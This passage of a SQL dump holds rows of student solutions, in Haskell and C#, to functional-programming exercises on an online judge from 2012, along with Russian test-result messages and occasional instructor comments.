[("x","y"),("y","z"), ("n","m")] ["x","w","y","z","x","n","m"]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2900, 84, '318210', '2012-10-30 00:56:40', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace Iterate212\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static IEnumerable<double> Iterate(double x, Func<double, double> f) {\r\n\r\n            double cur = x;\r\n\r\n            for (int i = 1; ; i++) {\r\n\r\n                cur = f(cur);\r\n\r\n                yield return cur;\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            foreach (double x in Iterate(2, x => x * 2))\r\n\r\n            {\r\n\r\n                // ну тут строго говоря не степени двойки до 1000000, но работает правильно\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (x > 1000000)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n\r\n\r\n            int i = 0;\r\n\r\n            foreach (double x in Iterate(1, Math.Sin))\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (i++ == 10)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2901, 81, '3431532', '2012-10-30 06:39:43', 1, 'lst239 = 2 : 3 : 9 : [x*10 + y| x <- lst239, y <- [2,3,9] ] ', '<br/>Тесты успешно пройдены!'),
(2902, 82, 'Deutsche', '2012-10-30 07:12:20', 1, 'This problem was sent by email, accept it please', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2903, 84, '3607492', '2012-10-30 07:38:29', 1, 'public static IEnumerable<double> Iterate (double a, Func<double,double> f)\r\n		{\r\n			for (;;) \r\n			{\r\n				yield return f (a);\r\n				a=f(a);\r\n			}\r\n		}', '<br/>Тесты успешно пройдены!'),
(2904, 83, 'Deutsche', '2012-10-30 08:54:18', 1, '﻿// Задача 21.1 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _21._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static int len = 0;\r\n\r\n        public static int reverse(int n)\r\n\r\n        {\r\n\r\n            string s = n.ToString();\r\n\r\n            string srev = new string(s.ToCharArray().Reverse().ToArray());\r\n\r\n            int k = Convert.ToInt32(srev);\r\n\r\n            return k;\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<int> lst239()\r\n\r\n        {\r\n\r\n            List<int> b = new List<int>();\r\n\r\n            b.Add(2); yield return 2;\r\n\r\n            b.Add(3); yield return 3;\r\n\r\n            b.Add(9); yield return 9;\r\n\r\n            for (int n = 1; ; n++)\r\n\r\n            {\r\n\r\n                List<int> c = b.GetRange(b.Count() - (int)Math.Pow(3, (int)n), (int)Math.Pow(3, (int)n));\r\n\r\n                foreach (int x in c)\r\n\r\n                {\r\n\r\n                    b.Add((int)(2 * Math.Pow((double)10, (double)n) + x));\r\n\r\n                    yield return (int)(2 * Math.Pow((double)10, (double)n) + x);\r\n\r\n                }\r\n\r\n                foreach (int x in c)\r\n\r\n                {\r\n\r\n                    b.Add((int)(3 * Math.Pow((double)10, (double)n) + x));\r\n\r\n                    yield return (int)(3 * Math.Pow((double)10, (double)n) + x);\r\n\r\n                }\r\n\r\n                foreach (int x in c)\r\n\r\n                {\r\n\r\n                    b.Add((int)(9 * Math.Pow((double)10, (double)n) + x));\r\n\r\n                    yield return (int)(9 * Math.Pow((double)10, (double)n) + x);\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int k = 0;\r\n\r\n            Console.WriteLine("First 100 numbers of lst239: ");\r\n\r\n            foreach (int x in lst239())\r\n\r\n            {\r\n\r\n                if (k == 99)\r\n\r\n                    Console.Write(x); // чтобы без запятой последнюю цифру\r\n\r\n                else Console.Write(x + ", ");\r\n\r\n                k++;\r\n\r\n                if (k == 100)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2905, 84, '3431532', '2012-10-30 09:24:47', 1, 'using System;\r\nusing System.Collections.Generic;\r\nnamespace simuni\r\n{\r\n	class MainClass\r\n	{\r\n		public static void Main (string[] args)\r\n		{\r\n			int i = 0;\r\n			foreach (double x in Iterate(1, Math.Sin))\r\n			{\r\n				Console.WriteLine(x);\r\n				if (i++ == 100)\r\n					break;\r\n			}\r\n		}\r\n\r\n		public static IEnumerable<double> Iterate (double x, Func<double,double> lFunc)\r\n		{\r\n			double val = x;\r\n			for(int i=0;;i++){\r\n				yield return val;\r\n				val = lFunc(val);\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2906, 83, '3431532', '2012-10-30 10:25:48', 1, 'using System;\r\nusing System.Collections.Generic;\r\nnamespace simuni\r\n{\r\n	class MainClass\r\n	{\r\n		public static void Main (string[] args)\r\n		{\r\n			int i = 0;\r\n			foreach (double x in lst239 ())\r\n			{\r\n				Console.WriteLine(x);\r\n				if (i++ == 20)\r\n					break;\r\n			}\r\n		}\r\n\r\n		public static IEnumerable<int> lst239()\r\n		{\r\n			int[] lst = {2,3,9};\r\n			foreach(int x in lst)\r\n				yield return x;\r\n			foreach (int i in lst239())\r\n			{\r\n				foreach(int x in lst)\r\n					yield return 10*i + x;\r\n			}\r\n		}\r\n\r\n\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2907, 83, '3607492', '2012-10-30 11:39:31', 1, '		public static IEnumerable<int> Lst239()\r\n		{\r\n			yield return 2;\r\n			yield return 3;\r\n			yield return 9;\r\n			foreach (int i in Lst239())\r\n			{\r\n				yield return i*10+2;\r\n				yield return i*10+3;\r\n				yield return i*10+9;\r\n			}\r\n		}', '<br/>Тесты успешно пройдены!'),
(2908, 79, '6774563', '2012-10-30 14:21:32', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace task19_1\r\n{\r\n    internal sealed class Program\r\n    {\r\n\r\n        private static IEnumerable<int> Digits(int n)\r\n        {\r\n            int k = 1;\r\n            while (true)\r\n            {\r\n                k *= 10;\r\n                yield return k/n;\r\n                k = k%n;\r\n            }\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int n = Int32.Parse(Console.ReadLine());\r\n            const int count = 100;\r\n            foreach (int digit in Digits(n).Take(count))\r\n            {\r\n                Console.Write("{0}, ", digit);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2909, 80, '6774563', '2012-10-30 14:21:45', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace task19_2\r\n{\r\n    internal sealed class Program\r\n    {\r\n        private static IEnumerable<Tuple<int, int>> AllPairs()\r\n        {\r\n            int sum = 0;\r\n            while (true)\r\n            {\r\n                for (int i = 1; i < sum; ++i)\r\n                {\r\n                    yield return new Tuple<int, int>(i, sum - i);\r\n                }\r\n                ++sum;\r\n            }\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            const int count = 15;\r\n            foreach(var pair in AllPairs().Take(count))\r\n            {\r\n                Console.WriteLine("{0}, {1}", pair.Item1, pair.Item2);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2910, 83, '6774563', '2012-10-30 14:26:59', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace task21_1\r\n{\r\n    internal sealed class Program\r\n    {\r\n        private static IEnumerable<int> Lst239()\r\n        {\r\n            yield return 2;\r\n            yield return 3;\r\n            yield return 9;\r\n            foreach (int a in Lst239())\r\n            {\r\n                yield return a*10 + 2;\r\n                yield return a*10 + 3;\r\n                yield return a*10 + 9;\r\n            }\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            const int count = 15;\r\n            foreach (int a in Lst239().Take(count))\r\n            {\r\n                Console.WriteLine(a);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2911, 84, '6774563', '2012-10-30 14:37:07', 0, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace task21_2\r\n{\r\n    internal sealed class Program\r\n    {\r\n        public static IEnumerable<T> Iterate<T>(T initial, Func<T,T> next)\r\n        {\r\n            yield return initial;\r\n            foreach (T cur in Iterate(next(initial), next))\r\n            {\r\n                yield return cur;\r\n            }\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            foreach (var x in Iterate(2, x => x * 2))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (x > 1000000)\r\n                {\r\n                    break;\r\n                }\r\n            }\r\n            Console.WriteLine("---------------------");\r\n            foreach (double x in Iterate<double>(1, Math.Sin).Take(100))\r\n            {\r\n                Console.WriteLine(x);\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2912, 84, '6774563', '2012-10-30 14:42:10', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace task21_2\r\n\r\n{\r\n\r\n    internal sealed class Program\r\n\r\n    {\r\n\r\n        // Почему-то обрезает дженерики, не знаю, видны ли они Вам\r\n   --- ОК, все видно..\r\n        public static IEnumerable<T> Iterate<T>(T initial, Func<T,T> next)\r\n\r\n        {\r\n\r\n            yield return initial;\r\n\r\n            foreach (T cur in Iterate(next(initial), next))\r\n\r\n            {\r\n\r\n                yield return cur;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            foreach (var x in Iterate(2, x => x * 2))\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (x > 1000000)\r\n\r\n                {\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            Console.WriteLine("---------------------");\r\n\r\n            foreach (double x in Iterate<double>(1, Math.Sin).Take(100))\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2913, 82, '2118411', '2012-10-30 15:19:45', 0, 'replaceAll [] vars = vars\r\nreplaceAll ((l,r):eqs) vars = replaceAll eqs newvars\r\n        where\r\n                tmp = [var | t <- vars, let var = if t==l then r else t]\r\n                newvars = [var | t <- tmp, let var = if t==r then l else t]\r\ncountIt res [] = res\r\ncountIt res (x:xs) = countIt (res+1) $filter (/=x) xs\r\ncountDifferentVars eqs vars = countIt 0 $replaceAll eqs vars\r\n', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]'),
(2914, 82, '2118411', '2012-10-30 15:29:33', 1, 'replaceAll [] vars = vars\r\nreplaceAll ((l,r):eqs) vars = replaceAll neweqs newvars\r\n        where\r\n                newvars = [var | t <- vars, let var = if t==l then r else t]\r\n                neweqs = [(eql, eqr) | (tl,tr)<-eqs, let eql=if tl==l then r else tl, let eqr=if tr==l then r else tr]\r\ncountIt res [] = res\r\ncountIt res (x:xs) = countIt (res+1) $filter (/=x) xs\r\ncountDifferentVars eqs vars = countIt 0 $replaceAll eqs vars\r\n', '<br/>Тесты успешно пройдены!'),
(2915, 78, '3742311', '2012-10-30 15:43:40', 1, 'pascal = [1]:(map (x -> zipWith (+) (0:x) (reverse (0:x))) pascal)', '<br/>Тесты успешно пройдены!'),
(2916, 83, '318210', '2012-10-30 15:57:27', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace lst239211\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static IEnumerable<int> Lst239()\r\n\r\n        {\r\n\r\n            yield return 2;\r\n\r\n            yield return 3;\r\n\r\n            yield return 9;\r\n\r\n            foreach (int i in Lst239())\r\n\r\n            {\r\n\r\n                yield return i * 10 + 2;\r\n\r\n                yield return i * 10 + 3;\r\n\r\n                yield return i * 10 + 9;\r\n\r\n            }\r\n\r\n\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            foreach (double x in Lst239())\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (x > 2222)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2917, 69, '9539826', '2012-10-30 16:30:13', 1, 'bigSin x = head ([n|n<-[sin z|z<-[1..]],n>=x])', '<br/>Тесты успешно пройдены!'),
(2918, 71, '9539826', '2012-10-30 18:13:59', 1, 'approxSum xs = foldl (+) 0 (approxSum1 xs [])\r\napproxSum1 (x:xs) ys = if (abs x)>=0.000001 then approxSum1 xs (x:ys) else ys\r\nseries = [1/(x*x)|x<-[1..]]\r\nz = approxSum series ', '<br/>Тесты успешно пройдены!'),
(2919, 74, '355679', '2012-10-30 18:27:19', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\n\r\n\r\n-- отличие от fold(r|l) для списков в том, что ф-я f должна принимать три параметра: --\r\n\r\n-- значение в вершине и 2 результата для детей, что вполне логично --\r\n\r\n\r\n\r\nfoldTree _ res Empty = res\r\n\r\nfoldTree f res (Node a t1 t2) = let {\r\n\r\n    res1 = foldTree f res t1;\r\n\r\n    res2 = foldTree f res t2;\r\n\r\n  } in (\r\n\r\n    f a res1 res2\r\n\r\n  )\r\n\r\n\r\n\r\n-- examples --\r\n\r\ntree = (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))\r\n\r\n\r\n\r\nasList = foldTree (x l r -> x : l ++ r) []\r\n\r\nsumTree = foldTree (x l r -> x + l + r) 0\r\n\r\nproductTree = foldTree (x l r -> x * l * r) 1\r\n\r\n\r\n\r\n-- либо можно добавить в конце "минус один", смотря что мы хотим посчитать: --\r\n\r\n-- количество узлов или ребер в самой длинной ветке --\r\n\r\nheight = foldTree (x l r -> max l r + 1) 0\r\n\r\n\r\n\r\nsumPos = foldTree (x l r -> l + r + (if x > 0 then x else 0)) 0\r\n', '<br/>Тесты успешно пройдены!'),
(2920, 73, '355679', '2012-10-30 18:37:57', 1, 'fibs1 = zipWith (+) (1:fibs1) (0:(0:fibs1))\r\n  --- Да, Хаскел всегда запоминает вычисленные значений констант (те определений без параметров)\r\n  --- так каку нас fibs без параметоров, то все его элементы, которые вычислятся, запомнятся\r\n  --- на все время существования fibs\r\n\r\n\r\n\r\n-- я подумал, что если хаскель не поймет, --\r\n\r\n-- что начало списка пересчитывать уже не надо, --\r\n\r\n-- то вариант выше на каждой итерации будет делать все сложения, --\r\n\r\n-- что и на предыдущей, плюс ещё одно. --\r\n\r\n-- но я, наверное, ошибаюсь, и хаскель не будет пересчитывать начало списка, --\r\n\r\n-- которое ему уже известно. --\r\n\r\nfibs2 = 1:(1:(\r\n\r\n    map\r\n\r\n      ( x -> (fibs2 !! x) + ( fibs2 !! (x - 1) ) )\r\n\r\n      [1..]\r\n    --- Но и так тоже можно, но немного медленнее, потому что на каждом шаге выполняется !!\r\n  ))\r\n\r\n\r\n\r\nfibs = fibs1\r\n', '<br/>Тесты успешно пройдены!'),
(2921, 72, '9539826', '2012-10-30 19:14:34', 0, 'weekendExpenses xs = foldl (+) 0 (weekendExpenses1 xs [] 1)\r\nweekendExpenses1 (x:xs) ys 6 = weekendExpenses1 xs (x:ys) 7\r\nweekendExpenses1 (x:xs) ys 7 = weekendExpenses1 xs (x:ys) 1\r\nweekendExpenses1 (x:xs) ys n = weekendExpenses1 xs ys (n+1)\r\nweekendExpenses1 [] ys n = ys', 'Не удалось вычислить выражение "weekendExpences [3,1,4,12,3,5,17,6,7,7,8,18,5,1,3]", проверьте правильность синтаксиса'),
(2922, 72, '9539826', '2012-10-30 19:17:28', 1, 'weekendExpences xs = foldl (+) 0 (weekendExpenses1 xs [] 1)\r\nweekendExpenses xs = foldl (+) 0 (weekendExpenses1 xs [] 1)\r\nweekendExpenses1 (x:xs) ys 6 = weekendExpenses1 xs (x:ys) 7\r\nweekendExpenses1 (x:xs) ys 7 = weekendExpenses1 xs (x:ys) 1\r\nweekendExpenses1 (x:xs) ys n = weekendExpenses1 xs ys (n+1)\r\nweekendExpenses1 [] ys n = ys\r\n', '<br/>Тесты успешно пройдены!'),
(2923, 73, 'Маргарита Нурмухаметова', '2012-10-30 20:10:02', 1, 'fibs = 1:1:(zipWith (+) fibs (tail fibs))\r\n', '<br/>Тесты успешно пройдены!'),
(2924, 69, 'Маргарита Нурмухаметова', '2012-10-30 20:10:34', 1, 'bigSin x = head (filter (>=x) (map sin [1..]))\r\n', '<br/>Тесты успешно пройдены!'),
(2925, 71, '1029771', '2012-10-30 20:20:37', 0, 'a = map(x -> 1/(x*x))[1,2..]\r\n\r\napproxSum f = if (head(f) < 0.000001) then 0\r\n	      else head(f) + (approxSum d) where d = tail(f)\r\n\r\nz = approxSum a', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2926, 71, '1029771', '2012-10-30 20:24:40', 1, 'a = map(x -> 1/(x*x))[1,2..]\r\n\r\napproxSum f = if (abs(head(f)) < 0.000001) then 0\r\n	      else head(f) + (approxSum d) where d = tail(f)\r\n\r\nz = approxSum a', '<br/>Тесты успешно пройдены!'),
(2927, 77, 'erwert', '2012-10-30 20:28:59', 1, 'convert r [] = r * r\r\nconvert r (h:hs) = convert (10 * r + h) hs\r\n\r\nnext l = last $ takeWhile (x -> n > convert 0 (l ++ [x])) [0..9]\r\n    where n = 2 * 10 ^ (2 * length l)\r\n\r\nget l d = if length l < d then get (l ++ [(next l)]) d  else last l\r\n\r\nsqrt2 = [get [] l | l <-[1..]]\r\n   --- ОК, но мне кажется, тут очень естественно оптимизировать, не считать каждый раз\r\n   --- get [] l заново, а как-то использовать то, что мы насчитали для предыдущего i\r\n', '<br/>Тесты успешно пройдены!'),
(2928, 80, '44060', '2012-10-30 20:53:27', 1, '  static IEnumerable<KeyValuePair<int, int» cantor() {\r\n            for (int i = 2; ; i++) {\r\n                for (int j = 1; j < i; j++) {\r\n                    yield return new KeyValuePair(j, i - j);\r\n                }\r\n            }\r\n        }', '<br/>Тесты успешно пройдены!'),
(2929, 72, '1029771', '2012-10-30 20:57:58', 1, 'week = 0:0:0:0:0:1:1:week\r\n\r\nweekendExpences a =   sum (zipWith (*) a week)', '<br/>Тесты успешно пройдены!'),
(2930, 79, '4169333', '2012-10-30 21:00:18', 1, 'namespace _1_05_11\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable <int> digits(int n)\r\n        {\r\n            int x = 10;\r\n            double b1 = 0;\r\n            double b = 0;\r\n            int res = 0;\r\n            for (int k = 1; ; k++)\r\n            {\r\n                b = x / n;\r\n                b1= Math.Floor(b);\r\n   --- Это вы, кстати, могли бы и не делать. Поскольку x и n - целые числа,\r\n   --- то и деление выполнется нацело, и b - это точно целое число\r\n \r\n                x = (x % n) * 10;\r\n                res = Convert.ToInt32(b1);\r\n                yield return res;\r\n                \r\n            }\r\n            \r\n        }\r\n    \r\n        static void Main(string[] args)\r\n        {\r\n            Int32 n=0;\r\n            n = Convert.ToInt32(Console.ReadLine());\r\n            foreach (int x in digits(n).Take(100))\r\n            {\r\n                 Console.Write(x+",");\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2931, 80, '4169333', '2012-10-30 21:01:03', 1, 'namespace _2_05_11\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable <KeyValuePair<int,int>> cantor()\r\n        {\r\n            for (int s = 1; ; s++)\r\n            {\r\n                for (int x = 1; x <= s; x++)\r\n                {\r\n                    KeyValuePair<int, int> keyValue = new KeyValuePair<int, int>(x, s - x + 1);\r\n                    yield return keyValue;\r\n                }\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int i=0;\r\n            int n=30;\r\n            foreach (KeyValuePair<int, int> x in cantor().Take(n))\r\n            {\r\n                i++;\r\n                if (i<n) \r\n                     Console.Write(x+",");\r\n                else\r\n                     Console.Write(x);\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2932, 75, '4169333', '2012-10-30 21:01:38', 1, 'foldr f e (x:xs) = f x (foldr f e xs)\r\nfoldr _ e [] = e\r\n2 фазы алгоритма:\r\n1) Ничего не знаем про аргументы: \r\n	a1(f)-> a2(e)-> a3(x:xs)-> a4(f x (foldr f e xs))\r\n2)Уточняем типы на основании использования:\r\n	(x:xs) имеет тип a3,то есть это список, значит a3=[a5],\r\n        f x (foldr f e xs) имеет тип a4,\r\n        foldr _ e []=e => a4=a2 =>  f x (foldr f e xs) имеет тип a2 => f :: a1=a6->a2->a2.\r\n	Т.о. получаем (a6->a2->a2) -> a2 ->[a5]-> a2\r\n        Докажем, что некоторые типы равны:\r\n	x   - аргумент f => a6\r\n	    - встречается в (x:xs)= a5, т.о. a5=a6.\r\nВ итоге имеем: (a5->a2->a2) -> a2 ->[a5]-> a2\r\n', '<br/>Тесты успешно пройдены!'),
(2933, 78, '4169333', '2012-10-30 21:06:47', 1, 'pascal= [1] : map (lst-> zipWith (+) (0:lst) (lst++[0])) pascal\r\n', '<br/>Тесты успешно пройдены!'),
(2934, 77, '533223', '2012-10-30 21:34:46', 0, 'sqrNumber 1 _ = [1]\r\nsqrNumber k xs = [ x| x<-[0..9], (sum (zipWith (*) (xs++[x]) (lst10 k)))^2<l,(sum (zipWith (*) (xs++[x+1]) (lst10 k)))^2>l  ]\r\n		where l = 2*10^(2*(k-1))\r\nlst10 1 = [1]\r\nlst10 k = 10^(k-1):(lst10 (k-1)) \r\n\r\nsqrHelp 1 = [1]\r\nsqrHelp k = xs ++ (sqrNumber k xs) where xs = sqrHelp (k-1)\r\n\r\nsqrHelp2 k = (head (sqrNumber k (sqrHelp (k-1)))):(sqrHelp2 (k+1))\r\n\r\nsqr2 = sqrHelp2 1sqrNumber 1 _ = [1]\r\nsqrNumber k xs = [ x| x<-[0..9], (sum (zipWith (*) (xs++[x]) (lst10 k)))^2<l,(sum (zipWith (*) (xs++[x+1]) (lst10 k)))^2>l  ]\r\n		where l = 2*10^(2*(k-1))\r\nlst10 1 = [1]\r\nlst10 k = 10^(k-1):(lst10 (k-1)) \r\n\r\nsqrHelp 1 = [1]\r\nsqrHelp k = xs ++ (sqrNumber k xs) where xs = sqrHelp (k-1)\r\n\r\nsqrHelp2 k = (head (sqrNumber k (sqrHelp (k-1)))):(sqrHelp2 (k+1))\r\n\r\nsqr2 = sqrHelp2 1', 'Не удалось вычислить выражение "take 20 sqrt2", проверьте правильность синтаксиса'),
(2935, 77, '533223', '2012-10-30 21:35:11', 0, 'sqrNumber 1 _ = [1]\r\nsqrNumber k xs = [ x| x<-[0..9], (sum (zipWith (*) (xs++[x]) (lst10 k)))^2<l,(sum (zipWith (*) (xs++[x+1]) (lst10 k)))^2>l  ]\r\n		where l = 2*10^(2*(k-1))\r\nlst10 1 = [1]\r\nlst10 k = 10^(k-1):(lst10 (k-1)) \r\n\r\nsqrHelp 1 = [1]\r\nsqrHelp k = xs ++ (sqrNumber k xs) where xs = sqrHelp (k-1)\r\n\r\nsqrHelp2 k = (head (sqrNumber k (sqrHelp (k-1)))):(sqrHelp2 (k+1))\r\n\r\nsqrt2 = sqrHelp2 1', '<br/>Тесты успешно пройдены!'),
(2936, 77, '533223', '2012-10-30 21:35:56', 1, 'sqrNumber 1 _ = [1]\r\nsqrNumber k xs = [ x| x<-[0..9], (sum (zipWith (*) (xs++[x]) (lst10 k)))^2<l,(sum (zipWith (*) (xs++[x+1]) (lst10 k)))^2>l  ]\r\n		where l = 2*10^(2*(k-1))\r\nlst10 1 = [1]\r\nlst10 k = 10^(k-1):(lst10 (k-1)) \r\n\r\nsqrHelp 1 = [1]\r\nsqrHelp k = xs ++ (sqrNumber k xs) where xs = sqrHelp (k-1)\r\n\r\nsqrHelp2 k = (head (sqrNumber k (sqrHelp (k-1)))):(sqrHelp2 (k+1))\r\n\r\nsqrt2 = sqrHelp2 1', '<br/>Тесты успешно пройдены!'),
(2937, 73, '472848', '2012-10-30 21:44:04', 1, 'fibs = 1:1:(zipWith (+) fibs (tail fibs))', '<br/>Тесты успешно пройдены!'),
(2938, 82, '63706456', '2012-10-30 21:48:50', 2, 'countDifferentVars [] ls = 0\r\n  --- А почему? Если нет равенств, это восе не значит, что ответ 0\r\ncountDifferentVars ((n,m):xs) ls | (n `elem` ls) || (m `elem` ls) = 1 + recur\r\n				 | otherwise = recur\r\n					where recur = countDifferentVars xs ls', 'Хитрый тест номер 5 не пройден :(<br/>Подсказка: Списки могут быть и пустыми..'),
(2939, 79, '44060', '2012-10-30 21:52:33', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace my {\r\n\r\nclass Ratios {\r\n	static IEnumerable digits(int n) {\r\n		int result = 10;\r\n		while (true) {\r\n			yield return result / n;\r\n			result = (result % n) * 10;\r\n		}\r\n	}\r\n	static void Main(string[] args) {\r\n		int n = 7;\r\n		int i = 5;\r\n		foreach (int k in digits(n)) {\r\n			if (i == 0) \r\n				break;\r\n			Console.Write(k);\r\n			--i;\r\n		}\r\n	}\r\n}\r\n}', '<br/>Тесты успешно пройдены!'),
(2940, 70, '1029771', '2012-10-30 22:02:49', 1, 'myFilter a b = foldr (x y-> if (a x) then x:y else y) [] b', '<br/>Тесты успешно пройдены!'),
(2941, 72, '1384577', '2012-10-31 09:42:42', 1, 'weekendExpences xs = foldr (+) 0 (map snd (filter ((x,y)-> x==6 || x==7)  (zip (cycle [1..7]) xs)))', '<br/>Тесты успешно пройдены!'),
(2942, 73, '1384577', '2012-10-31 10:01:13', 1, 'fibs = 1:fib1 \r\n	where\r\n     	fib0 = 0:fibs\r\n     	fib1 = zipWith (+) fib0 fibs', '<br/>Тесты успешно пройдены!'),
(2943, 69, '1384577', '2012-10-31 10:12:55', 1, 'bigSin x = head $ filter (>=x) $ map sin [1,2..] ', '<br/>Тесты успешно пройдены!'),
(2944, 69, '528420', '2012-10-31 10:24:10', 1, 'bigSin x = head [sin a | a<-[1..], sin a >= x]', '<br/>Тесты успешно пройдены!'),
(2945, 70, '1384577', '2012-10-31 10:26:59', 1, 'myFilter p = foldr (x xs -> if p x then x:xs else xs) []', '<br/>Тесты успешно пройдены!'),
(2946, 71, '528420', '2012-10-31 10:27:25', 1, 'approxSum xs = mySum xs 0 \r\nmySum (x:xs) res | (abs(x)>=0.000001) = mySum xs (res+x)\r\n                     | (abs(x)<0.000001) = res\r\n\r\nz = approxSum (map(x -> 1/(x*x))[1..])', '<br/>Тесты успешно пройдены!'),
(2947, 72, '528420', '2012-10-31 11:10:26', 1, 'weekendExpences xs = sum (expences xs (length xs) 5 [])\r\nexpences xs n k res | (n < k+1) = res\r\n                    | (n == k+1) = expences xs n (k+7) ((xs !! k):res)\r\n                    | (n > k+1) = expences xs n (k+7) ((xs !! k):(xs !! (k+1)):res)  ', '<br/>Тесты успешно пройдены!'),
(2948, 73, '528420', '2012-10-31 11:10:54', 1, 'fibs = 1 : 1 : [a + b | (a, b) <- zip fibs (tail fibs)]\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2949, 71, '1384577', '2012-10-31 11:18:44', 0, 'approxSum = foldr (x y -> if (abs(x)>=0.000001) then x+y else y) 0\r\nfrac = map (i -> 1/(i*i)) [1,2..1001]\r\nz = approxSum frac  ', 'Не удалось вычислить выражение "let x = approxSum [sin i/i | i<-[1..]] in x < 1.1", проверьте правильность синтаксиса'),
(2950, 76, '528420', '2012-10-31 11:49:15', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape a where\r\n  perimeter :: a -> Double\r\n  area :: a -> Double\r\n\r\ninstance Shape Circle where\r\n  perimeter (Circle r) = 2 * pi * r\r\n  area (Circle r) = pi * r * r\r\n\r\ninstance Shape Rect where\r\n  perimeter (Rect x y) = 2 * (x + y)\r\n  area (Rect x y) = x * y ', '<br/>Тесты успешно пройдены!'),
(2951, 71, '1384577', '2012-10-31 11:59:45', 1, 'approxSum = foldr (x y -> if (abs(x)>=0.000001) then x+y else x) 0 \r\nf = map (i -> 1/(i*i)) [1,2..]\r\nz = approxSum f  ', '<br/>Тесты успешно пройдены!'),
